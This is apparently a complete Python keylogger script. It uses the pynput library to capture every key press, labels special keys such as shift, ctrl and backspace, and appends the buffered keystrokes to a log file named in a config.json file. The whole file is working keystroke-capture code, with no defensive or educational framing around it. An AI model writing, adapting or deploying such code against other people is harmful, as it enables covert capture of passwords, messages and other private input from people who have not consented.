import json
from pathlib import Path
import pynput

SCRIPT_DIR = Path(__file__).parent.resolve()
CONFIG_PATH = SCRIPT_DIR / "config.json"

with open(CONFIG_PATH, "r") as config_file:
    config = json.load(config_file)

log_cfg = config["logging"]
flush_on_delimiter = log_cfg["flush_on_delimiter"]
new_line_per_delimiter = log_cfg["new_line_per_delimiter"]

output_dir = Path(log_cfg["output_directory"]) if log_cfg["output_directory"] else SCRIPT_DIR
log_file_path = output_dir / log_cfg["filename"]

keyboard = pynput.keyboard
SpecialKey = keyboard.Key
key_buffer = []

DELIMITER_KEYS = (SpecialKey.backspace, SpecialKey.space, SpecialKey.enter, SpecialKey.esc, SpecialKey.cmd)

KEY_MAP = {
    SpecialKey.space: " ",
    SpecialKey.enter: "\n",
    SpecialKey.backspace: " [BACKSPACE] ",
    SpecialKey.tab: " [TAB] ",
    SpecialKey.caps_lock: " [CAPS_LOCK] ",
    SpecialKey.shift: " [SHIFT] ",
    SpecialKey.shift_r: " [SHIFT] ",
    SpecialKey.ctrl: " [CTRL] ",
    SpecialKey.ctrl_r: " [CTRL] ",
    SpecialKey.alt: " [ALT] ",
    SpecialKey.alt_gr: " [ALT] ",
    SpecialKey.delete: " [DELETE] ",
    SpecialKey.esc: " [ESC] ",
}

def convert_key_to_str(key) -> str:
    if key in KEY_MAP:
        return KEY_MAP[key]
        
    if hasattr(key, "char") and key.char is not None:
        return key.char
        
    key_name = str(key).replace("Key.", "").upper()
    return f" [{key_name}] "

def save_to_log(text_data: str):
    print(text_data)
    with open(log_file_path, "a") as file:
        file.write(text_data)

def on_press(key):
    global key_buffer
    
    key_str = convert_key_to_str(key)
    key_buffer.append(key_str)

    if flush_on_delimiter and (key not in DELIMITER_KEYS):
        return  

    if new_line_per_delimiter:
        key_buffer.append("\n")
        
    log_payload = "".join(key_buffer)
    save_to_log(log_payload)

    if new_line_per_delimiter or not flush_on_delimiter:
        key_buffer.clear()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()